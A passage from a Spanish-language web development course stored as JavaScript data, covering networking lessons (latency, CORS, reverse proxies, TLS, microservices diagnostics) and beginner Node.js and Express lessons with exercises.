*   **Propagacin:** La velocidad de la luz en la fibra ptica tiene un lmite fsico. Cruzar el Atlntico siempre tardar al menos ~60ms.
*   **Procesamiento:** El tiempo que tardan los routers y firewalls en decidir a dnde enviar el paquete.
*   **Encolamiento:** Si un router est saturado, el paquete espera en una fila.

## 3. WebSockets (Full Duplex)
HTTP es "Request-Response" (el servidor no habla si no le preguntan). WebSockets rompe esto:
*   Inicia como una peticin HTTP (Upgrade) y luego se convierte en una conexin binaria persistente.
*   Permite que el servidor enve datos al cliente en tiempo real sin que este los pida (ej: chats, trading, notificaciones).

---

### Misin Semi-Senior:
Investiga el concepto de **TCP Fast Open**. Cmo ayuda este mecanismo a reducir la latencia del handshake en conexiones subsiguientes? Entender esto es la diferencia entre una app rpida y una app instantnea.
`,completed:!1},{id:"net-08-proxy-balanceo-cors",title:"Proxy Inverso, Balanceo de Carga y CORS",level:"semi-senior",content:`# Leccin 8: Proxy Inverso, Balanceo de Carga y CORS

Como desarrollador Semi-Senior, debes entender cmo se estructuran los servidores en produccin para manejar trfico masivo y seguridad.

## 1. Proxy Inverso (Reverse Proxy)
Un servidor (como Nginx o Apache) que se sita frente a tus servidores de aplicacin.
*   **Seguridad:** Oculta la identidad y direccin real de tus servidores internos.
*   **Terminacin SSL:** El proxy maneja el HTTPS pesado y entrega HTTP liviano a tus apps internas.
*   **Compresin y Cach:** Puede servir imgenes o archivos estticos sin molestar a tu cdigo de backend.

## 2. Load Balancing (Balanceo de Carga)
Distribuye las peticiones entrantes entre mltiples servidores de aplicacin.
*   **Algoritmos:** Round Robin (uno a cada uno), Least Connections (al que est menos ocupado), IP Hash (asigna siempre el mismo usuario al mismo servidor para mantener sesin).
*   **Health Checks:** El balanceador deja de enviar trfico a un servidor si este detecta que fall.

## 3. CORS (Cross-Origin Resource Sharing)
CORS NO es un error de cdigo, es una **caracterstica de seguridad del navegador**.
*   **El problema:** Por seguridad, un script en \`web-a.com\` no puede pedir datos a \`api-b.com\` a menos que \`api-b.com\` de permiso explcito.
*   **Preflight Request:** Antes de un POST o DELETE, el navegador enva un \`OPTIONS\`. El servidor debe responder con headers como \`Access-Control-Allow-Origin: *\`.
*   **La clave:** CORS se configura en el **servidor que recibe la peticin**, no en el cliente que la enva.

---

### Misin Semi-Senior:
Diferencia entre un **Forward Proxy** (el que usas para saltar un bloqueo de red) y un **Reverse Proxy** (el que usas para proteger tu infraestructura). Dibjalos mentalmente: el Forward protege al Cliente, el Reverse protege al Servidor.
`,completed:!1},{id:"net-09-practica-semi-senior",title:"Prctica: Simulacin de Arquitectura de Red",level:"semi-senior",content:`# Prctica: Simulacin de Arquitectura de Red

En este nivel, no solo diagnosticamos peticiones, sino que diseamos cmo fluyen a travs de una infraestructura profesional.

---

## Reto 1: Depuracin de Handshake y Latencia
**Consigna:** Usa las herramientas del navegador y la consola para medir el impacto de la red.
1.  En la pestaa **Network**, busca la columna "Waterfall". Identifica cunto tiempo se gasta en "Initial Connection" (Handshake) vs "Time to First Byte" (TTFB).
2.  Si el TTFB es alto, el problema es el servidor (tu cdigo). Si la "Initial Connection" es alta, es un problema de red o falta de optimizacin TLS.

## Reto 2: Configuracin Conceptual de Nginx
**Consigna:** Escribe la lgica de configuracin para un proxy inverso que:
1.  Reciba en el puerto 80.
2.  Redirija el trfico a una aplicacin Node.js corriendo internamente en el puerto 3000.
3.  Establezca un lmite de 10MB para subida de archivos (Client Max Body Size).

## Reto 3: Mitos y Realidades de CORS
**Consigna:** Identifica por qu falla esta peticin:
*   Cliente: \`frontend.com\` hace un \`PUT\` a \`api.com/users/1\`.
*   Servidor responde con: \`Access-Control-Allow-Origin: frontend.com\` pero se olvida de \`Access-Control-Allow-Methods: PUT\`.
*   **Resultado:** El navegador bloquear la respuesta aunque el "Origin" sea correcto. Configura correctamente los Headers de respuesta.

---

### Solucin Sugerida (Concepto Nginx):
\`\`\`nginx
server {
    listen 80;
    server_name misitio.com;
    
    location / {
        proxy_pass http://localhost:3000;
        proxy_set_header Host $host;
        client_max_body_size 10M;
    }
}
\`\`\`
Poder leer y escribir estas configuraciones bsicas es lo que separa a un desarrollador de software de un simple escritor de cdigo.
`,completed:!1,isProject:!0},{id:"net-10-tls",title:"TLS, Certificados y Seguridad de Red",level:"senior",content:`# Leccin 10: TLS, Certificados y Seguridad de Red

En el nivel Senior, la seguridad no es un agregado, es parte integral del diseo de la red. Entender cmo se cifra la comunicacin y cmo se validan las identidades es crtico.

## 1. TLS (Transport Layer Security)
TLS es el sucesor de SSL. Su objetivo es proporcionar privacidad e integridad de los datos entre dos aplicaciones.
*   **Handshake TLS:** Ocurre *despus* del handshake TCP. Incluye la negociacin de algoritmos de cifrado y el intercambio de claves.
*   **Cifrado Asimtrico vs Simtrico:** Se usa asimtrico (RSA/ECC) para intercambiar una clave secreta, y luego simtrico (AES) para la comunicacin de datos, por ser ms rpido.

## 2. Certificados Digitales (X.509)
Un certificado es un documento que vincula una clave pblica con una identidad (dominio).
*   **CA (Certificate Authority):** Entidades en las que todos confan (ej: Let's Encrypt). Si ellos firman tu certificado, el navegador confa en ti.
*   **Cadena de Confianza:** Tu certificado -> Certificado Intermedio -> Certificado Raz (Root CA).
*   **mTLS (Mutual TLS):** En entornos de microservicios, tanto el cliente como el servidor se presentan certificados el uno al otro para asegurar que ambos son legtimos.

## 3. Seguridad de Red (Defensa en Profundidad)
*   **Firewalls & WAF:** Un Firewall tradicional bloquea IP/Puertos. Un WAF (Web Application Firewall) analiza el trfico HTTP buscando ataques como SQL Injection o XSS.
*   **DDoS Mitigation:** Estrategias para absorber ataques de denegacin de servicio (Rate Limiting, IP Reputation, Scrubber Centers).
*   **VPNs y VPCs:** Aislamiento de infraestructura en nubes privadas virtuales.

---

### Misin Senior:
Investiga el concepto de **Certificate Pinning**. Por qu una aplicacin mvil querra ignorar la cadena de confianza del sistema operativo y confiar solo en un certificado especfico? Entiende los riesgos y beneficios de esta tcnica.
`,completed:!1},{id:"net-11-distribuida",title:"Networking en Microservicios y Cargas Distribuidas",level:"senior",content:`# Leccin 11: Networking en Microservicios y Arquitecturas Distribuidas

Cuando escalas a cientos de servicios, la red local desaparece y la comunicacin se vuelve el cuello de botella.

## 1. Service Discovery
Cmo sabe el Servicio A dnde est el Servicio B si las IPs cambian constantemente (ej: en Kubernetes)?
*   **Server-Side Discovery:** El cliente llama a un load balancer fijo que sabe a dnde ir.
*   **Client-Side Discovery:** El cliente consulta un registro (ej: Consul, Eureka) y elige el nodo directamente.

## 2. Service Mesh (La Red es Inteligente)
Una capa de infraestructura (ej: Istio, Linkerd) que maneja la comunicacin entre servicios mediante proxies "sidecar".
*   **Observabilidad:** Grficos automticos de quin habla con quin.
*   **Resiliencia:** Retries, Timeouts y Circuit Breakers automticos a nivel de red, sin tocar el cdigo de la app.

## 3. Comunicacin Asncrona vs Sncrona
*   **gRPC:** Alta performance mediante Protocol Buffers sobre HTTP/2. Ideal para comunicacin interna.
*   **Message Brokers:** (RabbitMQ, Kafka) Desacopla la red. El emisor no necesita que el receptor est "vivo" en ese instante.

## 4. Problemas Reales en Produccin
*   **Cascading Failures:** Un fallo en un servicio lento satura la red y tumba otros servicios sanos.
*   **DNS Polling:** Aplicaciones que cachean la IP de un servicio y no se enteran cuando este escala o cambia de nodo.
*   **Packet Loss Intermitente:** El infierno de los microservicios; difcil de replicar, solo visible con mtricas avanzadas.

---

### Misin Senior:
Disea mentalmente una solucin de **Circuit Breaker**. Qu debera pasar en la red cuando un servicio externo empieza a responder con errores 500 o tarda ms de 2 segundos? El objetivo es que tu sistema siga funcionando (aunque sea degradado).
`,completed:!1},{id:"net-12-practica-senior",title:"Prctica Senior: Diseo de Red Resiliente",level:"senior",content:`# Prctica Senior: Diseo de Red Resiliente y Segura

En este nivel final, el reto es disear la infraestructura de red para una startup en hiper-crecimiento.

---

## Reto 1: Diseo de Infraestructura Crtica
**Consigna:** Dibuja el diagrama lgico (o descrbelo) de una arquitectura que soporte los siguientes requisitos:
1.  **Alta Disponibilidad:** Dos regiones geogrficas distintas.
2.  **Seguridad:** Una red pblica (DMZ) para los proxies y una red privada aislada para las bases de datos.
3.  **Conexin entre regiones:** Uso de Peering o VPNs de baja latencia.

## Reto 2: Diagnstico de Incidentes de Produccin
**Consigna:** Analiza el siguiente escenario:
*   Durante un pico de trfico, los usuarios reportan que la app est "congelada".
*   Las mtricas de CPU del backend estn al 20%.
*   El Load Balancer reporta un incremento masivo de conexiones en estado \`TIME_WAIT\`.
*   **Preguntas:** Es un problema de cdigo o de configuracin de red? Cmo lo solucionaras a nivel de sistema operativo (Kernel tuning)?

## Reto 3: Transicin a mTLS
**Consigna:** Define el plan para implementar Mutual TLS en un clster de microservicios existente:
1.  Cmo gestionaras la rotacin de certificados sin downtime?
2.  Qu impacto tiene el handshake extra de mTLS en servicios que tienen miles de peticiones cortas por segundo?

---

### Solucin Sugerida (Escenario 2):
El problema de \`TIME_WAIT\` excesivo suele ser una saturacin de sockets en el balanceador. No es un error de lgica, sino que el sistema operativo agota los puertos disponibles para nuevas conexiones porque no libera los viejos lo suficientemente rpido. La solucin implica ajustar el \`net.ipv4.tcp_tw_reuse\` en el kernel de Linux.
`,completed:!1,isProject:!0},{id:"net-13-proyecto-redes",title:"Proyecto Prctico: Laboratorio de Networking y Diagnstico",level:"senior",content:`# Proyecto Prctico: Laboratorio de Networking y Diagnstico de APIs

Este proyecto final consolida todos los conocimientos del mdulo de Redes. Tu objetivo es actuar como un ingeniero de confiabilidad (SRE) para identificar por qu una API est fallando y cmo optimizar su comunicacin.

---

## 1. El Escenario de Simulacin
Imagina que tienes una aplicacin Frontend (\`localhost:3000\`) que intenta comunicarse con una API Backend (\`api.misistema.local:5000\`).

### Tarea 1: Simular la API (Conceptual)
Aunque no lances el servidor, analiza este flujo de "vida de una peticin":
1.  **Resolucin de Nombres:** El navegador busca \`api.misistema.local\`. No est en internet, es local. Dnde deberas configurarlo si no tienes un servidor DNS? (Pista: Archivo \`hosts\`).
2.  **Handshake:** Una vez obtenida la IP, se inicia la conexin en el puerto \`5000\`.

## 2. Anlisis de Requests (Deep Dive)
Usa las herramientas de desarrollador o \`curl -v\` para analizar una peticin real a cualquier API pblica (ej: \`https://jsonplaceholder.typicode.com/posts/1\`).

**Misin:** Identifica y explica qu sucede en cada uno de estos puntos del log de \`curl\`:
*   \`Connected to ... port 443 (#0)\`
*   \`ALPN, offering h2\`
*   \`SSL connection using TLSv1.3\`
*   \`GET /posts/1 HTTP/2\`
*   \`< HTTP/2 200\`

## 3. Diagnstico de Problemas (Laboratorio de Errores)
Para cada error reportado, indica la causa probable en qu capa del modelo OSI est fallando:

### Caso A: "Connection Refused"
*   **Sntoma:** Intentas conectar a la IP correcta pero el sistema operativo corta la conexin de inmediato.
*   **Diagnstico:** Est el proceso escuchando en el puerto? Hay un firewall en Capa 4 bloqueando la entrada?

### Caso B: "ERR_CORS_COMBINED_HEADER"
*   **Sntoma:** El servidor devuelve los datos (200 OK), pero el navegador no los muestra.
*   **Diagnstico:** Analiza los headers \`Access-Control-Allow-Origin\`. Estn configurados en el Backend?

### Caso C: "High TTFB (Time to First Byte)"
*   **Sntoma:** La conexin TCP es rpida, pero el navegador se queda "esperando" la respuesta por 5 segundos.
*   **Diagnstico:** La red est bien. El problema es Capa 7 (Lgica de negocio, consulta lenta a DB, procesamiento pesado).

## 4. Reto Final: El Salto de Proxy
Disea la cadena de comunicacin segura:
\`Cliente (Browser) -> HTTPS (443) -> Nginx Gateway -> HTTP (8080) -> Microservicio A\`.

**Pregunta Tcnica:** Si el Microservicio A recibe una peticin desde el gateway, la IP del cliente que ver ser \`127.0.0.1\` (la del proxy). Qu header HTTP debes configurar en el gateway para que el Microservicio A conozca la IP real del usuario? (Pista: \`X-Forwarded-For\`).

---

### Misin Cumplida:
Si puedes explicar este flujo completo, has dejado de ser un programador que "consume APIs" para convertirte en un desarrollador que entiende la infraestructura de internet.
`,completed:!1,isProject:!0}]},lv={id:"node",title:"Node.js",description:"Construye servidores y APIs robustas con el entorno de ejecucin de JavaScript ms popular.",completed:!1,lessons:[{id:"node-junior-que-es-node",title:"Qu es Node.js y cmo funciona?",level:"junior",content:`# Leccin 1: Qu es Node.js y cmo funciona?

Node.js no es un lenguaje de programacin ni un framework; es un **entorno de ejecucin (runtime)** para JavaScript fuera del navegador.

## 1. El Motor V8
Node.js utiliza el motor **V8** de Google Chrome (el mismo que usa tu navegador) para ejecutar cdigo JavaScript de forma extremadamente rpida. Chrome lo usa para renderizar pginas; Node lo usa para manejar lgica de servidor.

## 2. Basado en Eventos y No Bloqueante
Esta es la "magia" de Node. 
*   **Sncrono (Tradicional):** Si pides una pizza, te quedas parado en la puerta esperando sin hacer nada hasta que llegue. Si otra persona llama, tiene que esperar a que terminen contigo.
*   **Asncrono (Node.js):** Pides la pizza, te dan un ticket y te vas a ver una pelcula. Cuando la pizza est lista, te avisan (evento). Mientras tanto, la pizzera atendi a 20 personas ms.

Node.js puede manejar miles de conexiones simultneas porque no "se queda esperando" a que el disco duro lea un archivo o la base de datos responda; sigue ejecutando otras tareas.

## 3. Para qu sirve?
*   Crear APIs (servidores de datos).
*   Herramientas de lnea de comandos (como el propio \`npm\`).
*   Aplicaciones en tiempo real (Chat, juegos).
*   Streaming de video (Netflix usa Node).

## 4. Para qu NO sirve?
Node.js no es bueno para tareas que requieren mucho uso de CPU de forma intensiva y constante (como edicin de video de alta resolucin o clculos matemticos extremadamente complejos), ya que podra bloquear el hilo principal.

---

## Mini Ejercicio
Investiga en tu terminal si tienes Node instalado escribiendo \`node -v\`. Si te devuelve una versin (ej: v18.x.x), ests listo! Si no, debers descargarlo de nodejs.org.
`,completed:!1},{id:"node-junior-js-server",title:"JavaScript en el servidor",level:"junior",content:'# Leccin 2: JavaScript en el servidor\n\nEn el navegador, el objeto global es `window`. En Node.js, ese objeto no existe porque no hay una ventana de navegador.\n\n## 1. El objeto `global`\nEn Node, el objeto raz se llama `global`. Aqu viven funciones que ya conoces como `setTimeout`, `setInterval` y `console`.\n\n```javascript\n// Funciona igual que en el navegador\nsetTimeout(() => {\n  console.log("Servidor listo");\n}, 1000);\n```\n\n## 2. El objeto `process`\nEste objeto nos da informacin sobre el proceso actual que est ejecutando Node.\n*   `process.version`: Versin de Node.\n*   `process.platform`: Sistema operativo (win32, linux, darwin).\n*   `process.env`: Muy importante! Contiene las variables de entorno (claves secretas, puertos, etc.).\n*   `process.argv`: Argumentos que pasamos por la terminal al ejecutar el script.\n\n## 3. Lo que NO tenemos en Node\n*   `window` (No hay ventana).\n*   `document` (No hay DOM, no hay HTML para manipular directamente).\n*   `localStorage` (Usamos archivos o bases de datos).\n*   `alert()` (Usamos `console.log` o logs en archivos).\n\n## 4. Mentalidad Backend\nEn el frontend, escribes cdigo para **UN** usuario. En el backend, escribes cdigo para **MIL** usuarios que llaman al mismo tiempo. Un error en el navegador solo rompe la pgina de una persona. Un error en Node puede tumbar el servidor para todos.\n\n---\n\n## Mini Ejercicio\nCrea un archivo llamado `test.js` y escribe `console.log(process.platform)`. Ejectalo en tu terminal con el comando `node test.js`. Qu sistema operativo te detecta?\n',completed:!1},{id:"node-junior-event-loop",title:"Event Loop (El Corazn de Node)",level:"junior",content:`# Leccin 3: Event Loop (El Corazn de Node)

Node.js es **monohilo (single-threaded)**. Esto significa que solo puede ejecutar una instruccin a la vez. Sin embargo, puede manejar miles de peticiones. Cmo? Gracias al **Event Loop**.

## 1. El ciclo de vida de una tarea
Imagina a Node como un mesero en un restaurante:
1.  **Code Exec:** El mesero anota tu pedido (ejecuta tu cdigo sincrnico).
2.  **Libuv (Los Cocineros):** Si pides algo que tarda (leer un archivo, consultar una DB), el mesero le pasa la nota a los "cocineros" (el sistema operativo) y sigue atendiendo otras mesas.
3.  **Callback Queue:** Cuando los cocineros terminan, ponen el plato en una cinta transportadora.
4.  **Event Loop:** El mesero revisa constantemente la cinta. Si tiene un momento libre, toma el plato y lo entrega (ejecuta el callback).

## 2. Bloqueando el hilo (Lo que NO debes hacer)
Si escribes un bucle que tarda 10 segundos en terminar (un clculo matemtico pesado), el mesero se queda "congelado" procesando eso y no puede atender a nadie ms. Ninguna web cargar, nadie recibir respuesta.

\`\`\`javascript
//  ESTO ES PELIGROSO EN NODE
let i = 0;
while (i < 10000000000) { i++; } 
// El servidor est muerto mientras esto corre
\`\`\`

## 3. Asincrona con Callbacks
Antes usbamos callbacks para casi todo. Node tiene una convencin llamada **Error First Callback**:

\`\`\`javascript
const fs = require('fs');

fs.readFile('archivo.txt', 'utf8', (err, data) => {
  if (err) {
    console.error("Hubo un error");
    return;
  }
  console.log("Contenido:", data);
});
\`\`\`

---

## Mini Ejercicio
Qu crees que se imprimir primero en este cdigo?
\`\`\`javascript
console.log("A");
setTimeout(() => console.log("B"), 0);
console.log("C");
\`\`\`
Prubalo en la terminal. El resultado te sorprender y explica el Event Loop.
`,completed:!1},{id:"node-junior-npm-paquetes",title:"npm y Gestin de Paquetes",level:"junior",content:'# Leccin 4: npm y Gestin de Paquetes\n\n**npm** (Node Package Manager) es el registro de software ms grande del mundo. Viene instalado automticamente con Node.\n\n## 1. El comando `init`\nTodo proyecto de Node comienza creando un archivo llamado `package.json`. Es el "DNI" de tu proyecto.\n\n```bash\nnpm init -y\n```\nEl `-y` acepta todas las opciones por defecto ahorrndote tiempo.\n\n## 2. Instalando paquetes\nPara instalar una librera (por ejemplo, para manejar fechas):\n\n```bash\nnpm install date-fns\n```\nEsto har tres cosas:\n1.  Crea la carpeta `node_modules/` (donde vive el cdigo de la librera).\n2.  Agrega la librera a la seccin `dependencies` de tu `package.json`.\n3.  Crea un archivo `package-lock.json` (asegura que todos los desarrolladores instalen exactamente la misma versin).\n\n## 3. Dependencias vs DevDependencies\n*   **Dependencies:** Libreras necesarias para que la app funcione (ej: Express).\n*   **DevDependencies:** Herramientas solo para desarrollo (ej: un corrector de cdigo). Se instalan con `npm install --save-dev`.\n\n## 4. Scripts de npm\nEn `package.json` puedes crear atajos para comandos largos:\n\n```json\n"scripts": {\n  "start": "node index.js",\n  "dev": "nodemon index.js"\n}\n```\nLuego los ejecutas con `npm run dev` o `npm start`.\n\n---\n\n## Mini Ejercicio\nCrea una carpeta nueva, ejecuta `npm init -y` e instala la librera `colors`. Luego crea un `index.js` que diga `require(\'colors\'); console.log("Hola Node".green);` y ejectalo.\n',completed:!1},{id:"node-junior-modulos",title:"Sistema de Mdulos",level:"junior",content:`# Leccin 5: Sistema de Mdulos

En Node.js, cada archivo es un "mdulo". Para usar cdigo de un archivo en otro, debemos exportarlo e importarlo. Existen dos sistemas.

## 1. CommonJS (El estndar clsico)
Usa las palabras clave \`require\` y \`module.exports\`. Es el que vers en la mayora de tutoriales antiguos y proyectos legacy.

\`\`\`javascript
// matematicas.js
const sumar = (a, b) => a + b;
module.exports = { sumar };

// app.js
const { sumar } = require('./matematicas');
console.log(sumar(2, 2));
\`\`\`

## 2. ESModules (El estndar moderno)
Usa \`import\` y \`export\`. Es el mismo sistema que usa React. Para habilitarlo en Node, debes agregar \`"type": "module"\` en tu \`package.json\`.

\`\`\`javascript
// matematicas.js
export const sumar = (a, b) => a + b;

// app.js
import { sumar } from './matematicas.js'; //  Importante: hay que poner la extensin .js
\`\`\`

## 3. Mdulos Nativos (Build-in)
Node ya trae herramientas integradas que no necesitas instalar con npm:
*   \`fs\`: Para manejar archivos (FileSystem).
*   \`path\`: Para manejar rutas de carpetas.
*   \`http\`: Para crear servidores.
*   \`os\`: Informacin del sistema operativo.

## 4. Error Comn: Mezclar sistemas
No puedes usar \`require\` dentro de un archivo que est configurado como \`module\` (ESM), y viceversa, a menos que hagas configuraciones complejas. Elige uno y mantente fiel a l en todo tu proyecto.

---

## Mini Ejercicio
Crea dos archivos. Uno que exporte una funcin \`saludar(nombre)\` y otro que la importe y la ejecute. Intenta hacerlo usando CommonJS primero.
`,completed:!1},{id:"node-junior-servidor-basico",title:"Tu Primer Servidor HTTP",level:"junior",content:`# Leccin 6: Tu Primer Servidor HTTP

Antes de usar frameworks elegantes, vamos a ver cmo se crea un servidor usando solo lo que Node trae de fbrica.

## 1. El mdulo \`http\`
Node tiene un mdulo nativo llamado \`http\` que permite "escuchar" peticiones que llegan por un puerto.

\`\`\`javascript
const http = require('http');

const server = http.createServer((request, response) => {
  console.log("Lleg una peticin!");
  
  // Enviamos una cabecera diciendo que todo est bien (200) y que es texto plano
  response.writeHead(200, { 'Content-Type': 'text/plain' });
  
  // Enviamos el mensaje final
  response.end("Hola desde mi servidor nativo");
});

const PORT = 3000;
server.listen(PORT, () => {
  console.log(\`Servidor corriendo en http://localhost:\${PORT}\`);
});
\`\`\`

## 2. Request y Response
*   **Request (req):** Es el objeto que contiene lo que el usuario enva (la URL, los datos del formulario, el navegador que usa).
*   **Response (res):** Es el objeto que usamos para contestarle (el cdigo de estado 200, 404, 500, y el contenido).

## 3. El problema de hacerlo "a mano"
Si queremos que \`/contacto\` devuelva una cosa y \`/perfil\` otra, tendramos que llenar nuestro cdigo de \`if (req.url === '/contacto')\`. Es tedioso y difcil de mantener. Por eso usamos frameworks como **Express**.

## 4. Cdigo de Estados (Bsico)
*   **200:** OK (Todo bien).
*   **404:** Not Found (No existe lo que buscas).
*   **500:** Internal Server Error (Tu cdigo explot).

---

## Mini Ejercicio
Modifica el servidor anterior para que si la URL es \`/html\`, responda con un \`<h1>Hola</h1>\` y el \`Content-Type\` sea \`text/html\`.
`,completed:!1},{id:"node-junior-intro-express",title:"Introduccin a Express.js",level:"junior",content:`# Leccin 7: Introduccin a Express.js

**Express** es el framework web ms popular para Node.js. Es minimalista, rpido y nos hace la vida mucho ms fcil.

## 1. Instalacin
Lo primero es instalarlo como una dependencia:
\`\`\`bash
npm install express
\`\`\`

## 2. Un servidor con Express
Compara este cdigo con el de la leccin anterior. Mucho ms legible, verdad?

\`\`\`javascript
const express = require('express');
const app = express();
const port = 3000;

app.get('/', (req, res) => {
  res.send('Hola Mundo con Express!');
});

app.listen(port, () => {
  console.log(\`App escuchando en http://localhost:\${port}\`);
});
\`\`\`

## 3. Por qu Express?
*   **Routing sencillo:** Manejar URLs es muy intuitivo.
*   **Middlewares:** Permite procesar datos antes de que lleguen a la ruta final.
*   **Plug-and-play:** Existen miles de libreras diseadas especficamente para funcionar con Express.

## 4. El flujo de una peticin en Express
1.  El usuario escribe una URL.
2.  Express busca si tienes una ruta definida para esa URL y para ese **Mtodo HTTP** (GET, POST, etc).
3.  Si la encuentra, ejecuta la funcin callback.
4.  La funcin enva la respuesta con \`res.send()\` o \`res.json()\`.

---

## Mini Ejercicio
Instala Express en un proyecto nuevo y crea una ruta \`/api\` que devuelva un objeto JSON: \`{ "status": "ok", "message": "API funcionando" }\`. Usa \`res.json()\`.
`,completed:!1},{id:"node-junior-rutas",title:"Rutas y Mtodos HTTP",level:"junior",content:`# Leccin 8: Rutas y Mtodos HTTP

En las APIs modernas, usamos los **Mtodos HTTP** para indicar qu queremos hacer con los datos.

## 1. Los 4 mtodos principales (CRUD)
*   **GET:** Para obtener o leer datos.
*   **POST:** Para crear nuevos datos (enviar un formulario, por ejemplo).
*   **PUT:** Para actualizar datos existentes.
*   **DELETE:** Para borrar datos.

\`\`\`javascript
app.get('/usuarios', (req, res) => res.send('Lista de usuarios'));
app.post('/usuarios', (req, res) => res.send('Usuario creado'));
\`\`\`

## 2. Parmetros de Ruta (Rutas Dinmicas)
Cmo sabemos qu usuario especfico queremos ver? Usamos dos puntos \`:\` para definir una variable en la URL.

\`\`\`javascript
app.get('/usuarios/:id', (req, res) => {
  const userId = req.params.id;
  res.send(\`Viendo el perfil del usuario con ID: \${userId}\`);
});
\`\`\`

## 3. Query Params
Son los datos que vienen despus del signo \`?\` en la URL. Se usan para filtrar o buscar.

\`\`\`javascript
// URL: /buscar?color=rojo&talla=L
app.get('/buscar', (req, res) => {
  const { color, talla } = req.query;
  res.send(\`Buscando productos de color \${color} y talla \${talla}\`);
});
\`\`\`

## 4. Error Comn: Olvidar el orden
Express revisa las rutas de **arriba hacia abajo**. Si pones una ruta muy genrica arriba, podra "comerse" a una ruta ms especfica que est abajo. Siempre pon las rutas con parmetros al final.

---

## Mini Ejercicio
Crea una ruta que reciba el nombre de un pas como parmetro (\`/pais/:nombre\`) y responda con "Has buscado el pas: [nombre]".
`,completed:!1},{id:"node-junior-req-res",title:"El objeto Request y Response",level:"junior",content:`# Leccin 9: El objeto Request y Response

Estos dos objetos son los protagonistas de cada funcin de ruta en Express. Vamos a ver sus propiedades ms tiles.

## 1. El objeto Request (req)
Contiene todo lo que viene del cliente.
*   \`req.params\`: Variables de la URL (/:id).
*   \`req.query\`: Variables de bsqueda (?nombre=juan).
*   \`req.body\`: Los datos enviados en un POST (requiere un middleware para leerse).
*   \`req.headers\`: Informacin tcnica (qu navegador usa, si tiene un token de seguridad).

## 2. El objeto Response (res)
Es tu herramienta para contestar.
*   \`res.send()\`: Enva texto u HTML.
*   \`res.json()\`: Enva un objeto JSON (el estndar de las APIs).
*   \`res.status()\`: Define el cdigo de error.
*   \`res.redirect()\`: Manda al usuario a otra pgina.
*   \`res.sendFile()\`: Enva un archivo fsico (imagen, PDF).

## 3. Encadenamiento (Method Chaining)
En Express es comn encadenar mtodos:

\`\`\`javascript
app.get('/error', (req, res) => {
  res.status(404).json({ error: "No encontrado" });
});
\`\`\`

## 4. Error Comn: "Cannot set headers after they are sent"
Este error ocurre cuando intentas enviar **dos respuestas** para una misma peticin. Recuerda: una peticin = una respuesta. Si usas un \`if\`, asegrate de usar \`return res.send()\` para que el cdigo no siga ejecutndose y trate de enviar otra respuesta debajo.

---

## Mini Ejercicio
Crea una ruta que verifique si existe un parmetro \`token\`. Si no existe, devuelve un status 401 (No autorizado) con un JSON de error. Si existe, devuelve un 200 con xito.
`,completed:!1},{id:"node-junior-middlewares",title:"Middlewares (Los Intermediarios)",level:"junior",content:`# Leccin 10: Middlewares (Los Intermediarios)

Un **Middleware** es simplemente una funcin que se ejecuta **antes** de llegar a tu ruta final. Es como un guardia de seguridad que revisa a la gente antes de entrar a un club.

## 1. Cmo se ven?
Tienen tres argumentos: \`req\`, \`res\` y \`next\`. La funcin \`next()\` le dice a Express: "Todo bien, deja pasar al siguiente".

\`\`\`javascript
const miMiddleware = (req, res, next) => {
  console.log(\`Peticin recibida a las \${new Date().toLocaleTimeString()}\`);
  next(); //  Obligatorio! Si no lo pones, la app se queda colgada
};

app.use(miMiddleware); // Se aplica a TODAS las rutas
\`\`\`

## 2. Tipos de Middlewares
*   **De Aplicacin:** Se usan con \`app.use()\` para todo el servidor (ej: logs, seguridad).
*   **De Ruta:** Se ponen entre la URL y la funcin final solo para una ruta especfica.
*   **Incorporados:** Express ya trae algunos, como \`express.json()\` para poder leer el cuerpo de los POST.

## 3. Ejemplo Real: \`express.json()\`
Sin esto, \`req.body\` ser \`undefined\`. Debes ponerlo al principio de tu archivo.

\`\`\`javascript
app.use(express.json());

app.post('/datos', (req, res) => {
  console.log(req.body); // Ahora s podemos verlo
  res.send("Recibido");
});
\`\`\`

## 4. El peligro de no llamar a \`next()\`
Si tu middleware no llama a \`next()\` ni enva una respuesta con \`res.send()\`, el navegador del usuario se quedar cargando infinitamente hasta que de un "Timeout". 

---

## Mini Ejercicio
Crea un middleware que imprima la URL de cada peticin que llegue al servidor. salo de forma global con \`app.use()\`.
`,completed:!1},{id:"node-junior-buenas-practicas",title:"Buenas Prcticas de Inicio",level:"junior",content:`# Leccin 11: Buenas Prcticas de Inicio

Construir un servidor es fcil; construir uno que sea fcil de mantener es el objetivo.

## 1. No subas \`node_modules\` a Git
Esa carpeta es gigante y cualquier desarrollador puede recrearla con \`npm install\`. Crea siempre un archivo \`.gitignore\` y escribe \`node_modules\` dentro.

## 2. Usa Variables de Entorno
Nunca escribas contraseas o el puerto del servidor directamente en el cdigo. Usa una librera llamada \`dotenv\`.
*   Crea un archivo \`.env\` para tus secretos.
*   Lelos con \`process.env.MI_SECRETO\`.

## 3. Divide y Vencers (Estructura de Carpetas)
No pongas 50 rutas en el mismo \`index.js\`.
*   \`routes/\`: Archivos para las URLs.
*   \`controllers/\`: La lgica de qu hacer con los datos.
*   \`models/\`: Estructura de la base de datos.

## 4. Usa herramientas de desarrollo
Instala **Nodemon**: \`npm install --save-dev nodemon\`.
Nodemon reinicia tu servidor automticamente cada vez que guardas un cambio en el cdigo, ahorrndote horas de tiempo.

## 5. Manejo de Errores Global
Siempre ten una ruta final o un middleware que capture errores inesperados para que tu servidor no se caiga ante la primera falla.

\`\`\`javascript
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send('Algo sali mal!');
});
\`\`\`

---

## Proyecto Final Junior
Crea una API de "Gestin de Estudiantes":
1.  Usa Express y \`npm init\`.
2.  Crea una lista (array) de estudiantes en memoria.
3.  Implementa rutas para:
    *   Ver todos los estudiantes (GET).
    *   Ver un estudiante por ID (GET dinmica).
    *   Agregar un nuevo estudiante (POST con \`express.json\`).
4.  Crea un middleware que registre cada peticin en un archivo \`.txt\` usando el mdulo \`fs\`.

Felicidades! Has dado tus primeros pasos firmes en el mundo del Backend. 
`,completed:!1},{id:"node-junior-ejercicios",title:"Ejercicios Prcticos: Node.js Junior",level:"junior",content:`# Ejercicios Prcticos: Node.js Junior

Aplica lo aprendido construyendo servidores reales. Estos ejercicios te llevarn desde lo ms bsico hasta crear una API funcional.

---

## 1. El Servidor "Reloj Mundial"
**Objetivo:** Practicar el mdulo nativo \`http\` y el objeto \`Response\`.

**Consigna:**
Crea un servidor usando \`http.createServer\` que:
*   Al acceder a \`/\`, responda con un mensaje de bienvenida.
*   Al acceder a \`/hora\`, responda con la fecha y hora actual del servidor en formato texto.
